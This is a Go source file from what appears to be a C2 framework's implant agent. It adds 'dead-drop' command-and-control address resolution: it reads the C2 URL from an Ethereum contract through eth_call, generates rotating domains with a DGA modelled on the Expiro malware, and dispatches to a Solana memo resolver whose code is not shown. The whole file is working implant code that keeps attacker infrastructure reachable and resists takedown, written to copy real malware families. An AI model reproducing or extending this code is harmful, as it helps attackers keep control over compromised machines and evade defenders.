//go:build linux || windows || darwin
// +build linux windows darwin

package main

// Dead-drop C2 address resolution. Some in-the-wild implants keep their C2
// address out of the binary and recover it at runtime — from an on-chain
// contract (Ethereum/Polygon `eth_call`, Solana `getAccountInfo`) or from a
// time-seeded algorithmically-generated domain (DGA). This file gives the Go
// agent the same two primitives, opt-in and bounded, with a strict fail-closed
// contract: a resolver that returns nothing or something malformed never
// replaces the compiled-in C2 list.

import (
	"bytes"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"strings"
	"time"
)

// c2ResolverMaxResponse bounds a resolver HTTP body. A dead-drop endpoint is
// untrusted infrastructure; an unbounded read would let it OOM the implant.
const c2ResolverMaxResponse = 64 << 10 // 64 KiB

const (
	c2ResolverKindChain  = "chain"  // on-chain eth_call / account data
	c2ResolverKindDGA    = "dga"    // time-seeded generated domains
	c2ResolverKindSolana = "solana" // Solana transaction memo (OverLord / ClickFix)
)

// c2ResolverSpec is the decoded form of C2ResolverStr (JSON, injected at build
// time via the config blob or overwritten at runtime by FORGEC2_C2_RESOLVER).
//
//	{"kind":"chain","rpc":"https://ethereum-rpc.publicnode.com",
//	 "contract":"0x9999...","data":"0xc2fb26a6","cap":4}
//	{"kind":"dga","seed":"forgec2","tld":"biz","count":128,"period_minutes":30}
//	{"kind":"solana","rpc":"https://api.mainnet-beta.solana.com",
//	 "address":"<memo-program-signer>","token":"<agent-token>","cap":4}
//
// `cap` limits how many resolved addresses are published; `count` is the DGA
// ring size and `period_minutes` the rotation window (Expiro uses 128/30).
// For `solana`, `address` is the account whose recent transactions are scanned
// and `token` is the shared secret whose SHA-256 is the AES-256-GCM key for the
// memo (OverLord uses SHA256(agentToken) as the key).
type c2ResolverSpec struct {
	Kind          string `json:"kind"`
	RPC           string `json:"rpc"`
	Contract      string `json:"contract"`
	Data          string `json:"data"`
	Cap           int    `json:"cap"`
	Seed          string `json:"seed"`
	TLD           string `json:"tld"`
	Count         int    `json:"count"`
	PeriodMinutes int    `json:"period_minutes"`
	// Solana-specific fields.
	Address string   `json:"address"`
	Token   string   `json:"token"`
	RPCs    []string `json:"rpcs"`
}

func parseC2ResolverSpec(raw string) (c2ResolverSpec, error) {
	var spec c2ResolverSpec
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return spec, fmt.Errorf("empty resolver spec")
	}
	if err := json.Unmarshal([]byte(raw), &spec); err != nil {
		return spec, fmt.Errorf("resolver spec: %w", err)
	}
	switch spec.Kind {
	case c2ResolverKindChain:
		if spec.RPC == "" || spec.Contract == "" || spec.Data == "" {
			return spec, fmt.Errorf("chain resolver needs rpc, contract and data")
		}
		if !strings.HasPrefix(strings.ToLower(spec.RPC), "https://") {
			return spec, fmt.Errorf("chain resolver rpc must be https")
		}
		if spec.Cap <= 0 || spec.Cap > 16 {
			spec.Cap = 4
		}
	case c2ResolverKindDGA:
		if spec.Seed == "" || spec.TLD == "" {
			return spec, fmt.Errorf("dga resolver needs seed and tld")
		}
		if spec.Count <= 0 || spec.Count > 512 {
			spec.Count = 128
		}
		if spec.PeriodMinutes <= 0 || spec.PeriodMinutes > 1440 {
			spec.PeriodMinutes = 30
		}
	case c2ResolverKindSolana:
		// RPCs may be a single RPC or a list; normalize the single form.
		if spec.RPC != "" && len(spec.RPCs) == 0 {
			spec.RPCs = []string{spec.RPC}
		}
		if len(spec.RPCs) == 0 || spec.Address == "" || spec.Token == "" {
			return spec, fmt.Errorf("solana resolver needs rpcs, address and token")
		}
		for _, rpc := range spec.RPCs {
			if !strings.HasPrefix(strings.ToLower(rpc), "https://") {
				return spec, fmt.Errorf("solana resolver rpc must be https")
			}
		}
		if spec.Cap <= 0 || spec.Cap > 16 {
			spec.Cap = 4
		}
	default:
		return spec, fmt.Errorf("unknown resolver kind %q", spec.Kind)
	}
	return spec, nil
}

// isSafeResolvedURL accepts only absolute http(s) URLs. A resolver is remote
// input; letting it inject a file:// or a scheme-less string into the C2 list
// would turn a dead-drop into an arbitrary outbound target.
func isSafeResolvedURL(raw string) bool {
	raw = strings.TrimSpace(raw)
	return strings.HasPrefix(raw, "https://") || strings.HasPrefix(raw, "http://")
}

// decodeEthCallString decodes the Solidity `string` returned by an eth_call:
// a 0x-prefixed hex blob of (offset, length, bytes, padding). It refuses short
// blobs, out-of-range offsets/lengths and non-printable payloads, and the
// caller caps the number of addresses via the spec.
func decodeEthCallString(raw string) (string, error) {
	raw = strings.TrimSpace(strings.TrimPrefix(raw, "0x"))
	raw = strings.TrimPrefix(raw, "0X")
	b, err := hex.DecodeString(raw)
	if err != nil {
		return "", fmt.Errorf("eth_call result is not hex: %w", err)
	}
	if len(b) < 64 {
		return "", fmt.Errorf("eth_call result too short")
	}
	off := intFromWord(b[0:32])
	length := intFromWord(b[32:64])
	if off < 0 || length < 0 || length > c2ResolverMaxResponse {
		return "", fmt.Errorf("eth_call offset/length out of range")
	}
	start := off + 32 // offset is relative to the start of the dynamic tail (word 1)
	if start < 0 || length > len(b)-start {
		return "", fmt.Errorf("eth_call string exceeds result")
	}
	s := string(b[start : start+length])
	s = strings.TrimRight(s, "\x00")
	if !isPrintableURL(s) {
		return "", fmt.Errorf("eth_call string is not a printable URL")
	}
	return s, nil
}

func isPrintableURL(s string) bool {
	if s == "" {
		return false
	}
	for _, r := range s {
		if r < 0x20 || r == 0x7f {
			return false
		}
	}
	return true
}

// intFromWord reads the low 8 bytes of a 32-byte big-endian ABI word. Values
// above 2^63 are rejected rather than wrapped, so a malicious word cannot
// turn into a negative length that passes the range check.
func intFromWord(word []byte) int {
	if len(word) < 32 {
		return -1
	}
	hi := word[:24]
	for _, v := range hi {
		if v != 0 {
			return -1
		}
	}
	n := int64(0)
	for _, v := range word[24:32] {
		n = n<<8 | int64(v)
	}
	if n < 0 || n > int64(c2ResolverMaxResponse) {
		return -1
	}
	return int(n)
}

type jsonRPCRequest struct {
	JSONRPC string        `json:"jsonrpc"`
	ID      int           `json:"id"`
	Method  string        `json:"method"`
	Params  []interface{} `json:"params"`
}

type jsonRPCResponse struct {
	Result string `json:"result"`
	Error  *struct {
		Message string `json:"message"`
	} `json:"error"`
}

// chain eth_call: POST the JSON-RPC request with the injected client (already
// uTLS/timeout-configured), require a 200, decode one Solidity string, and
// return it as a single-element URL list. All decoding happens before any URL
// reaches the C2 list — malformed input produces an error, never a publish.
func resolveChainC2(c *http.Client, spec c2ResolverSpec) ([]string, error) {
	call := map[string]string{"to": spec.Contract, "data": spec.Data}
	body, err := json.Marshal(jsonRPCRequest{
		JSONRPC: "2.0", ID: 1, Method: "eth_call",
		Params: []interface{}{call, "latest"},
	})
	if err != nil {
		return nil, err
	}
	req, err := http.NewRequest(http.MethodPost, spec.RPC, bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := c.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("resolver rpc status %d", resp.StatusCode)
	}
	raw, err := io.ReadAll(io.LimitReader(resp.Body, c2ResolverMaxResponse))
	if err != nil {
		return nil, err
	}
	var rpc jsonRPCResponse
	if err := json.Unmarshal(raw, &rpc); err != nil {
		return nil, fmt.Errorf("resolver rpc json: %w", err)
	}
	if rpc.Error != nil {
		return nil, fmt.Errorf("resolver rpc error: %s", rpc.Error.Message)
	}
	url, err := decodeEthCallString(rpc.Result)
	if err != nil {
		return nil, err
	}
	if !isSafeResolvedURL(url) {
		return nil, fmt.Errorf("resolved address is not http(s)")
	}
	return []string{url}, nil
}

// dgaDomains generates `count` deterministic domains for the window containing
// `now`. Deriving the seed from the window index (not the absolute time) means
// every implant with the same seed walks the same ring in the same order, which
// is what makes a dead-drop resolvable without a shared clock beyond the window.
func dgaDomains(spec c2ResolverSpec, now time.Time) []string {
	window := now.Unix() / int64(spec.PeriodMinutes*60)
	out := make([]string, 0, spec.Count)
	for i := 0; i < spec.Count; i++ {
		label := dgaLabel(spec.Seed, window, i)
		out = append(out, "https://"+label+"."+spec.TLD)
	}
	return out
}

// dgaLabel is a small deterministic PRNG over (seed, window, index). It is not
// cryptographic: its job is reproducibility across implants, not secrecy of the
// next domain. Each label is 5-8 lowercase letters, matching the Expiro ring.
func dgaLabel(seed string, window int64, index int) string {
	h := fnv1a64(seed + strconv.FormatInt(window, 10) + ":" + strconv.Itoa(index))
	n := 5 + int(h%4) // 5..8 letters
	b := make([]byte, n)
	for i := range b {
		b[i] = byte('a' + (h>>(6*(i%9)))%26)
		// Re-mix so adjacent characters are not just shifted copies of h.
		h = fnv1a64(string(b[i]) + strconv.FormatUint(h, 36))
	}
	return string(b)
}

func fnv1a64(s string) uint64 {
	const (
		offset = uint64(14695981039346656037)
		prime  = uint64(1099511628211)
	)
	h := offset
	for i := 0; i < len(s); i++ {
		h ^= uint64(s[i])
		h *= prime
	}
	return h
}

// applyC2Resolver runs once at startup (from main, after the HTTP `client`
// exists). It prepends resolved addresses to the compiled-in C2 list and keeps
// the compiled-in list as fallback. Any error or empty result is fail-closed:
// the published list is identical to the compiled-in one.
func applyC2Resolver() {
	raw := strings.TrimSpace(C2ResolverStr)
	if raw == "" {
		return
	}
	resolved, err := resolveC2URLs(client, raw, time.Now())
	if err != nil {
		logDebugf("[resolver] failed (kept compiled-in C2): %v", err)
		return
	}
	current := c2URLsSnapshot()
	merged := make([]string, 0, len(resolved)+len(current))
	seen := make(map[string]bool, len(resolved)+len(current))
	for _, u := range append(append([]string{}, resolved...), current...) {
		u = strings.TrimSpace(u)
		if u == "" || seen[u] {
			continue
		}
		seen[u] = true
		merged = append(merged, u)
	}
	if len(merged) > 0 {
		c2URLsStore(merged, 0)
		logDebugf("[resolver] published %d address(es)", len(resolved))
	}
}

// resolveC2URLs is the single entry point used at startup. It never mutates the
// compiled-in list: on any error or empty result the caller keeps the original
// URLs. Returning an empty slice means "no replacement".
func resolveC2URLs(c *http.Client, raw string, now time.Time) ([]string, error) {
	spec, err := parseC2ResolverSpec(raw)
	if err != nil {
		return nil, err
	}
	switch spec.Kind {
	case c2ResolverKindChain:
		return resolveChainC2(c, spec)
	case c2ResolverKindDGA:
		// Count already bounds the ring (max 512 enforced by the parser), so
		// publish the whole generated list — there is no second cap here.
		return dgaDomains(spec, now), nil
	case c2ResolverKindSolana:
		return resolveSolanaC2(c, spec)
	}
	return nil, fmt.Errorf("unhandled resolver kind")
}
